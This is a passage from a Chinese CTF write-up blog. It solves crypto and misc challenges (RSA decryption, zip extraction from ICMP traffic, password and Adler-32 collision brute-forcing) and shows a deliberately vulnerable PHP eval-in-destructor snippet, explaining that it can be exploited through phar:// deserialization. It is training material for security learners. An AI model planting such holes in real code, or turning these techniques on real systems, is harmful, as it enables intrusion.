class="keyword">import</span> gmpy2</span><br><span class="line">n=<span class="number">829467319</span></span><br><span class="line"><span class="comment"># 使用yafu离线分解得到p,q</span></span><br><span class="line">p = <span class="number">36497</span></span><br><span class="line">q = <span class="number">22727</span></span><br><span class="line">e=<span class="number">48357</span></span><br><span class="line"><span class="keyword">assert</span>(p*q==n)</span><br><span class="line">phi=(p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">d=gmpy2.invert(e,phi)</span><br><span class="line">c=[<span class="number">322517722</span>,<span class="number">575397051</span>,<span class="number">76525646</span>,<span class="number">768452152</span>,<span class="number">107590034</span>,<span class="number">710690594</span>,<span class="number">322517722</span>,<span class="number">174907762</span>,<span class="number">343945760</span>,<span class="number">763355610</span>,<span class="number">301647581</span>,<span class="number">349705569</span>,<span class="number">575397051</span>,<span class="number">76525646</span>,<span class="number">410109929</span>,<span class="number">322517722</span>,<span class="number">497916224</span>,<span class="number">228868281</span>,<span class="number">228868281</span>,<span class="number">741167939</span>,<span class="number">497916224</span>,<span class="number">450014050</span>,<span class="number">322517722</span>,<span class="number">322517722</span>,<span class="number">126657310</span>,<span class="number">349705569</span>,<span class="number">322517722</span>,<span class="number">707637171</span>,<span class="number">76525646</span>,<span class="number">527107437</span>,<span class="number">710690594</span>,<span class="number">685252839</span>,<span class="number">450014050</span>,<span class="number">349705569</span>,<span class="number">388149253</span>,<span class="number">710690594</span>,<span class="number">763355610</span>,<span class="number">211593791</span>,<span class="number">707637171</span>,<span class="number">369453331</span>,<span class="number">228868281</span>,<span class="number">541631545</span>,<span class="number">397988536</span>,<span class="number">322517722</span>,<span class="number">12982396</span>,<span class="number">107590034</span>,<span class="number">387385119</span>,<span class="number">322517722</span>,<span class="number">685252839</span>,<span class="number">710690594</span>,<span class="number">322517722</span>,<span class="number">109170298</span>,<span class="number">349705569</span>,<span class="number">763355610</span>,<span class="number">349705569</span>,<span class="number">349705569</span>,<span class="number">37195518</span>,<span class="number">25028382</span>,<span class="number">610867628</span>,<span class="number">44896265</span>,<span class="number">25028382</span>,<span class="number">454683367</span>,<span class="number">15283689</span>]</span><br><span class="line"></span><br><span class="line">s=<span class="string">''</span>.join(map(<span class="keyword">lambda</span> ci:chr(pow(ci,d,n)),c))</span><br><span class="line">print(s) <span class="comment"># _stIwn_:!oAestN_rii.ra__&#125;e_gt8nuae1nolg0iYf_2w&#123;_un_CeoeeEhychST</span></span><br></pre></td></tr></table></figure><p><img src="1543149985751.png" alt="1543149985751"></p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="MISC1"><a href="#MISC1" class="headerlink" title="MISC1"></a>MISC1</h3><p>部分ICMP包DATA字段携带数据，且逐字节为504B…，很显然是个压缩包，使用命令行工具tshark提取对应字段。</p><p>tshark用法参考<code>tshark --help</code> 或 <a href="https://www.cnblogs.com/liun1994/p/6142505.html" target="_blank" rel="noopener">Wireshark命令行工具tshark使用小记</a> 。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ tshark -r pcapng.pcapng  -Y <span class="string">"icmp and icmp.ident==0x930a"</span>  -T fields -e data | xxd -r -p &gt; flag.zip &amp;&amp; xxd flag.zip</span><br><span class="line">00000000: 504b 0304 1400 0100 0000 0386 584d 2a17  PK..........XM*.</span><br><span class="line">00000010: fbf2 3200 0000 2600 0000 0800 0000 666c  ..2...&amp;.......fl</span><br><span class="line">00000020: 6167 2e74 7874 c541 e340 943c a98d fc66  ag.txt.A.@.&lt;...f</span><br><span class="line">00000030: 952e 0ffe 9ff3 8797 7647 b934 6d3d 8d3d  ........vG.4m=.=</span><br><span class="line">00000040: b94c fc2d cb14 16f3 723a ab5c 5e7f 0903  .L.-....r:.\^...</span><br><span class="line">00000050: 64ea 7b5b 1ae0 1a4c 504b 0102 3f00 1400  d.&#123;[...LPK..?...</span><br><span class="line">00000060: 0100 0000 0386 584d 2a17 fbf2 3200 0000  ......XM*...2...</span><br><span class="line">00000070: 2600 0000 0800 2400 0000 0000 0000 2000  &amp;.....$....... .</span><br><span class="line">00000080: 0000 0000 0000 666c 6167 2e74 7874 0a00  ......flag.txt..</span><br><span class="line">00000090: 2000 0000 0000 0100 1800 cee8 7c47 766b   ...........|Gvk</span><br><span class="line">000000a0: d401 7d2d ec42 766b d401 7d2d ec42 766b  ..&#125;-.Bvk..&#125;-.Bvk</span><br><span class="line">000000b0: d401 504b 0506 0000 0000 0100 0100 5a00  ..PK..........Z.</span><br><span class="line">000000c0: 0000 5800 0000 0000 0050                 ..X......P</span><br><span class="line">neo@u:/mnt/d/cwd/bailu/mis1$</span><br></pre></td></tr></table></figure><p>使用ziperello爆破密码为q，得到<code>flag{d27ca49cb6f5583ae9f3bb2ec38190de}</code> 。</p><h3 id="MISC2"><a href="#MISC2" class="headerlink" title="MISC2"></a>MISC2</h3><h4 id="problem-2"><a href="#problem-2" class="headerlink" title="problem"></a>problem</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>safe box<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">body &#123;</span></span><br><span class="line"><span class="undefined">  text-align: center;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">input &#123;</span></span><br><span class="line"><span class="undefined">  font-size: 200%;</span></span><br><span class="line"><span class="undefined">  margin-top: 5em;</span></span><br><span class="line"><span class="undefined">  text-align: center;</span></span><br><span class="line"><span class="undefined">  width: 26em;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">#result &#123;</span></span><br><span class="line"><span class="undefined">  margin-top: 8em;</span></span><br><span class="line"><span class="undefined">  font-size: 300%;</span></span><br><span class="line"><span class="undefined">  font-family: monospace;</span></span><br><span class="line"><span class="undefined">  font-weight: bold;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">body.granted&gt;#result::before &#123;</span></span><br><span class="line"><span class="undefined">  content: "Access Granted";</span></span><br><span class="line"><span class="undefined">  color: green;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">body.denied&gt;#result::before &#123;</span></span><br><span class="line"><span class="undefined">  content: "Access Denied";</span></span><br><span class="line"><span class="undefined">  color: red;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">#content &#123;</span></span><br><span class="line"><span class="undefined">  display: none;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">body.granted #content &#123;</span></span><br><span class="line"><span class="undefined">  display: initial;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">@keyframes spin &#123;</span></span><br><span class="line"><span class="undefined">  from &#123; transform: rotateY(0); &#125;</span></span><br><span class="line"><span class="undefined">  to &#123; transform: rotateY(360deg); &#125;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">.cube &#123;</span></span><br><span class="line"><span class="undefined">  animation: spin 20s infinite linear;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">.cube div &#123;</span></span><br><span class="line"><span class="undefined">  position: absolute;</span></span><br><span class="line"><span class="undefined">  width: 200px;</span></span><br><span class="line"><span class="undefined">  height: 200px;</span></span><br><span class="line"><span class="undefined">  background: rgba(0, 0, 0, 0.51);</span></span><br><span class="line"><span class="undefined">  box-shadow: inset 0 0 60px white;</span></span><br><span class="line"><span class="undefined">  font-size: 20px;</span></span><br><span class="line"><span class="undefined">  text-align: center;</span></span><br><span class="line"><span class="undefined">  line-height: 200px;</span></span><br><span class="line"><span class="undefined">  color: rgba(0,0,0,0.5);</span></span><br><span class="line"><span class="undefined">  font-family: sans-serif;</span></span><br><span class="line"><span class="undefined">  text-transform: uppercase;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">  <span class="function"><span class="keyword">function</span> <span class="title">adler32</span>(<span class="params">str</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> a = <span class="number">1</span>, b = <span class="number">0</span>, L = str.length, M = <span class="number">0</span>, c = <span class="number">0</span>, d = <span class="number">0</span>;</span></span><br><span class="line"><span class="undefined"> </span></span><br><span class="line"><span class="javascript">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; L;) &#123;</span></span><br><span class="line"><span class="javascript">        M = <span class="built_in">Math</span>.min(L - i, <span class="number">3850</span>);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">while</span> (M &gt; <span class="number">0</span>) &#123;</span></span><br><span class="line"><span class="undefined">            c = str.charCodeAt(i++);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">if</span> (c &lt; <span class="number">0x80</span>) &#123; a += c; &#125;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">else</span> <span class="keyword">if</span> (c &lt; <span class="number">0x800</span>) &#123;</span></span><br><span class="line"><span class="undefined">                a += 192 | ((c &gt;&gt; 6) &amp; 31); b += a; --M;</span></span><br><span class="line"><span class="undefined">                a += 128 | (c &amp; 63);</span></span><br><span class="line"><span class="javascript">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c &gt;= <span class="number">0xD800</span> &amp;&amp; c &lt; <span class="number">0xE000</span>) &#123;</span></span><br><span class="line"><span class="undefined">                c = (c &amp; 1023) + 64; d = str.charCodeAt(i++) &amp; 1023;</span></span><br><span class="line"><span class="undefined">                a += 240 | ((c &gt;&gt; 8) &amp; 7); b += a; --M;</span></span><br><span class="line"><span class="undefined">                a += 128 | ((c &gt;&gt; 2) &amp; 63); b += a; --M;</span></span><br><span class="line"><span class="undefined">                a += 128 | ((d &gt;&gt; 6) &amp; 15) | ((c &amp; 3) &lt;&lt; 4); b += a; --M;</span></span><br><span class="line"><span class="undefined">                a += 128 | (d &amp; 63);</span></span><br><span class="line"><span class="javascript">            &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="undefined">                a += 224 | ((c &gt;&gt; 12) &amp; 15); b += a; --M;</span></span><br><span class="line"><span class="undefined">                a += 128 | ((c &gt;&gt; 6) &amp; 63); b += a; --M;</span></span><br><span class="line"><span class="undefined">                a += 128 | (c &amp; 63);</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="undefined">            b += a; --M;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">        a = (15 * (a &gt;&gt;&gt; 16) + (a &amp; 65535));</span></span><br><span class="line"><span class="undefined">        b = (15 * (b &gt;&gt;&gt; 16) + (b &amp; 65535));</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">return</span> ((b % <span class="number">65521</span>) &lt;&lt; <span class="number">16</span>) | (a % <span class="number">65521</span>);</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params">х</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">  <span class="keyword">if</span>(х!=<span class="string">"0x0201"</span>&amp;&amp;adler32(х)==adler32(<span class="string">"0x0201"</span>))&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">return</span> <span class="literal">true</span>;</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="javascript">  <span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">return</span> <span class="literal">false</span>;</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">open_safe</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">  keyhole.disabled = <span class="literal">true</span>;</span></span><br><span class="line"><span class="javascript">  password = <span class="regexp">/^password&#123;([0-9a-zA-Z_@!?-]+)&#125;$/</span>.exec(keyhole.value);</span></span><br><span class="line"><span class="javascript">  <span class="keyword">if</span> (!password || !check(password[<span class="number">1</span>])) <span class="keyword">return</span> <span class="built_in">document</span>.body.className = <span class="string">'denied'</span>;</span></span><br><span class="line"><span class="javascript">  <span class="built_in">document</span>.body.className = <span class="string">'granted'</span>;</span></span><br><span class="line"><span class="javascript">  content.value = <span class="string">"\x00\x00\x00\x00\x00\x83\x00\x00\x00N\x00\x01\x00\x01\x00\x00\x00\x00\x06\x05KP\x00\x00\x00\x00\x04\x00\x00\x00\x00\x04\x01\x00\x0bxu[\xd1\x9e\x8d\x03\x00\x05TUtxt.galf\x00\x00\x00\x00\x81\xa4\x00\x00\x00\x01\x00\x00\x00\x00\x00\x18\x00\x08\x00\x00\x00%\x00\x00\x001=\x16\x04\x0cMY\x95\x8f\x00\x00\x00\t\x00\n\x03\x1e\x02\x01KP\x00\x00\x00%\x00\x00\x001=\x16\x04\x0c\x08\x07KP\x045R\tM\xc2\xde\x14sg\x92\xd0K\xbfh\x9c\x08\xeb\xf3@\x9d\x00\x14\x8b^\xfb\xa5\x96O\xc0\xdd\x8a(\xe6\x0c\x92\x1e \xad\x86\xa6@\xbc@J=\x11Z\xfe\x00\x00\x00\x00\x04\x00\x00\x00\x00\x04\x01\x00\x0bxu[\xd1\x9e\xfb[\xd1\x9e\x8d\x03\x00\tTUtxt.galf\x00\x1c\x00\x08\x00\x00\x00%\x00\x00\x001=\x16\x04\x0cMY\x95\x8f\x00\x00\x00\t\x00\n\x04\x03KP"</span>;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">"keyhole"</span> <span class="attr">autofocus</span> <span class="attr">onchange</span>=<span class="string">"open_safe()"</span> <span class="attr">placeholder</span>=<span class="string">"🔑"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"result"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">"content"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="solve-2"><a href="#solve-2" class="headerlink" title="solve"></a>solve</h4><p>显然密码正确后输出的conten.value是一个压缩包反转后的内容，提取得到压缩包发现加密，猜测密码要能走通JS逻辑。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="string">"\x00\x00\x00\x00\x00\x83\x00\x00\x00N\x00\x01\x00\x01\x00\x00\x00\x00\x06\x05KP\x00\x00\x00\x00\x04\x00\x00\x00\x00\x04\x01\x00\x0bxu[\xd1\x9e\x8d\x03\x00\x05TUtxt.galf\x00\x00\x00\x00\x81\xa4\x00\x00\x00\x01\x00\x00\x00\x00\x00\x18\x00\x08\x00\x00\x00%\x00\x00\x001=\x16\x04\x0cMY\x95\x8f\x00\x00\x00\t\x00\n\x03\x1e\x02\x01KP\x00\x00\x00%\x00\x00\x001=\x16\x04\x0c\x08\x07KP\x045R\tM\xc2\xde\x14sg\x92\xd0K\xbfh\x9c\x08\xeb\xf3@\x9d\x00\x14\x8b^\xfb\xa5\x96O\xc0\xdd\x8a(\xe6\x0c\x92\x1e \xad\x86\xa6@\xbc@J=\x11Z\xfe\x00\x00\x00\x00\x04\x00\x00\x00\x00\x04\x01\x00\x0bxu[\xd1\x9e\xfb[\xd1\x9e\x8d\x03\x00\tTUtxt.galf\x00\x1c\x00\x08\x00\x00\x00%\x00\x00\x001=\x16\x04\x0cMY\x95\x8f\x00\x00\x00\t\x00\n\x04\x03KP"</span></span><br><span class="line">f=open(<span class="string">'extract.zip'</span>,<span class="string">'wb'</span>).write(s[::<span class="number">-1</span>])</span><br></pre></td></tr></table></figure><p>使用JavaScript爆破密码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">dec2hexString</span>(<span class="params">dec</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'0x'</span> + (dec+<span class="number">0x10000</span>).toString(<span class="number">16</span>).substr(<span class="number">-4</span>).toUpperCase();</span><br><span class="line"> &#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bruteforce</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>;i&lt;<span class="number">0xffff</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(check(dec2hexString(i)))<span class="built_in">console</span>.log(<span class="string">"password&#123;"</span>+dec2hexString(i)+<span class="string">"&#125;"</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">bruteforce()</span><br><span class="line"><span class="comment">// password&#123;0x0120&#125; √</span></span><br><span class="line"><span class="comment">// password&#123;0x1011&#125; ×</span></span><br></pre></td></tr></table></figure><p>或者使用python爆破：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /^password&#123;([0-9a-zA-Z_@!?-]+)&#125;$/</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">adler32</span><span class="params">(s)</span>:</span></span><br><span class="line">    i=<span class="number">0</span>;a=<span class="number">1</span>;b=<span class="number">0</span>;M=<span class="number">0</span>;c=<span class="number">0</span>;d=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i&lt;len(s):</span><br><span class="line">        M=min(len(s)-i,<span class="number">3850</span>)</span><br><span class="line">        <span class="keyword">while</span> M&gt;<span class="number">0</span>:</span><br><span class="line">            c=ord(s[i]);i+=<span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> c&lt; <span class="number">0x80</span>:</span><br><span class="line">                a+=c</span><br><span class="line">            <span class="keyword">elif</span> c&gt;<span class="number">0xd800</span> <span class="keyword">and</span> c &lt; <span class="number">0xe000</span>:</span><br><span class="line">                c= (c &amp; <span class="number">1023</span>) +<span class="number">64</span> ;d = s[i]&amp;<span class="number">1023</span>;i+=<span class="number">1</span></span><br><span class="line">                a+=<span class="number">240</span> | ((c &gt;&gt; <span class="number">8</span>) &amp; <span class="number">7</span>); b += a; M-=<span class="number">1</span></span><br><span class="line">                a += <span class="number">128</span> | ((c &gt;&gt; <span class="number">2</span>) &amp; <span class="number">63</span>); b += a; M-=<span class="number">1</span></span><br><span class="line">                a += <span class="number">128</span> | ((d &gt;&gt; <span class="number">6</span>) &amp; <span class="number">15</span>) | ((c &amp; <span class="number">3</span>) &lt;&lt; <span class="number">4</span>); b += a; M-=<span class="number">1</span></span><br><span class="line">                a += <span class="number">128</span> | (d &amp; <span class="number">63</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                a += <span class="number">224</span> | ((c &gt;&gt; <span class="number">12</span>) &amp; <span class="number">15</span>); b += a;M-=<span class="number">1</span></span><br><span class="line">                a += <span class="number">128</span> | ((c &gt;&gt; <span class="number">6</span>) &amp; <span class="number">63</span>); b += a;M-=<span class="number">1</span></span><br><span class="line">                a += <span class="number">128</span> | (c &amp; <span class="number">63</span>)</span><br><span class="line">            b+=a;M-=<span class="number">1</span></span><br><span class="line">        a = (<span class="number">15</span> * (a &gt;&gt; <span class="number">16</span>) + (a &amp; <span class="number">65535</span>))</span><br><span class="line">        b = (<span class="number">15</span> * (b &gt;&gt; <span class="number">16</span>) + (b &amp; <span class="number">65535</span>))</span><br><span class="line">    <span class="keyword">return</span> ((b % <span class="number">65521</span>) &lt;&lt; <span class="number">16</span>) | (a % <span class="number">65521</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> itertools.product(<span class="string">'0123456789'</span>,repeat=<span class="number">4</span>):</span><br><span class="line">    p=<span class="string">'0x'</span>+<span class="string">''</span>.join(i)</span><br><span class="line">    <span class="keyword">if</span> adler32(p)==adler32(<span class="string">'0x0201'</span>):</span><br><span class="line">        <span class="keyword">print</span> p,</span><br><span class="line">        <span class="comment"># [0x0120] 0x0201 0x1011</span></span><br></pre></td></tr></table></figure><p>密码为<code>password{0x0120}</code> ，解压得到flag。<code>flag{cjvf33_98hfi3_jfh3_dsh93h_f3had}</code> 。</p><h3 id="MISC3"><a href="#MISC3" class="headerlink" title="MISC3"></a>MISC3</h3><p>给了1321个TXT，每个文件一个字符，内容如下。提示时间戳，没搞懂要干啥。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cat ./*</span><br><span class="line">Money is not evil by itself.Its just paper with perceived value to obtain other things we value <span class="keyword">in</span> other ways.If not money - what is. evil you may ask?Evil is the unquenchable, obsessive and moral bending desire <span class="keyword">for</span> more.Evil is the bottomless, soulless and obsessive-compulsive pursuit of some pot of gold.at the end of some rainbow <span class="built_in">which</span> doesn<span class="string">'t exist.Evil is having a price tag for your heart and soul in exchange for financial success at any cost.Evil is trying to buy happiness, again and again.until all of those fake, short lived mirages of emotions are gone.Make more time.I'</span>m not saying you can<span class="string">'t be financially successful.I'</span>m saying have a greater purpose <span class="keyword">in</span> life well beyond the pursuit of financial success.Your soul is screaming <span class="keyword">for</span> you to answer your <span class="literal">true</span> calling.You can change today <span class="keyword">if</span> you redefine what success is to you.You can transform your damaged relationships and build new ones.You can forgive yourself and others who<span class="string">'ve hurt you.You can become a leader by mentoring with others who you aspire to be like.You can re-balance your priorities in life.You can heal your marriage and recreate a stronger love than you ever thought possible.You can become the best parent possible at any age - even 86.but don'</span>t <span class="built_in">wait</span> until then...You will always be able to make more money.But you cannot make more time.</span><br></pre></td></tr></table></figure><p>记录一个获取文件时间的方式。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line">a=subprocess.check_output((<span class="string">"stat"</span>,<span class="string">"-c"</span>, <span class="string">"%y"</span>, file_name))</span><br></pre></td></tr></table></figure><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Web1"><a href="#Web1" class="headerlink" title="Web1"></a>Web1</h3><p>万能密码</p><h3 id="Web2"><a href="#Web2" class="headerlink" title="Web2"></a>Web2</h3><p>主页CTRL+U，发现源码泄露。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//http://172.16.17.2/file_aq12ws.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'filename'</span>]))&#123;</span><br><span class="line">$filename=$_GET[<span class="string">'filename'</span>];</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $output = <span class="string">'echo "hahaha";'</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span> -&gt; output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">file_exists($filename);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是前段时间black hat上提到的利用phar伪协议在一些文件系统函数中触发反序列化漏洞。</p><p>phar文件本质上是一个压缩文件，在manifest部分存放每个被压缩文件的权限、属性等信息和用户自定义的meta-data数据，后者是以序列化后的形式存在的。而PHP中大部分文件系统函数在通过 <code>phar://</code> 伪协议解析phar文件时，都会将meta-data反序列化。因此就有了本题的反序列化触发点file_exists函数。除了file_exists还有下图所示的函数，详见 <a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">利用 phar 拓展 php 反序列化漏洞攻击面</a> 。</p><p><img src="17c4c630-b5f7-4e02-af48-160cd8fcf73a.png-w331s" 